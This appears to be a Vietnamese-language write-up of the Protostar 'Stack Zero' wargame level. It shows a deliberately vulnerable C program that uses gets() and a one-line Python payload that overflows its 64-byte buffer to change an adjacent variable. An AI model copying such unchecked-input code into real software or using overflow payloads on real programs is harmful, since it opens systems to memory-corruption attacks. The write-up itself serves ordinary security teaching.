# STACK ZERO

## About

This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.

This level is at /opt/protostar/bin/stack0

## Source code

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

## Solutions

Ta có cấu trúc của stack memory sẽ nhìn như này:

```
     high memory adddress
  | |====================| 
  | |   name-parameter   |  |
  | |====================|  | STACK
  S |   return address   |  | grow
  T |====================|  | direction
  A |  base-pointer|'''''|  |
  C |==============|'''''|  |
  K |''''''''''''''''''''|  |
  | |'''''''buffer'''''''|  |
  | |''''''''''''''''''''|  |
  | |====================|  |
  | |                    |  v
  | |....................|
      low memory address
```

Biến `modified` được khai báo `volatile int` và gán giá trị bằng 1 sau đó có mảng `buffer` gồm 64 ký tự. `Buffer` lấy giá trị từ hàm nhập gets().

Đây là hướng dẫn về hàm gets của Linux `$ man gets`

```man
DESCRIPTION
       Never use this function.

       gets() reads a line from stdin into the buffer pointed to by s until ei‐
       ther a terminating newline or EOF, which it replaces with  a  null  byte
       ('\0').  No check for buffer overrun is performed (see BUGS below).
```

Ngay đầu mô tả ta đã thấy không bao giờ sử dụng hàm này vì gets nhận 1 dòng ký tự từ stdin cho đến khi gặp ký tự newline thì thay thế newline = NULL byte ('\0') và đặc biệt hàm không kiểm tra số ký tự được nhập vào -> gây ra buffer overflow.

`STACK ZERO` yêu cầu chúng ta thay đổi giá trị mặc định của biến `modified` != `0`. Ta sẽ nhập nhiều hơn 64 ký tự của `buffer` với gets để ghi đè lên biến `modified` theo như bố cục trên STACK.

```
root@protostar:/opt/protostar/bin# python -c 'print "A" * 65' | ./stack0
you have changed the 'modified' variable
```

## Documents

<https://en.wikipedia.org/wiki/Stack-based_memory_allocation>

<https://www.educative.io/edpresso/what-is-gets-in-c>
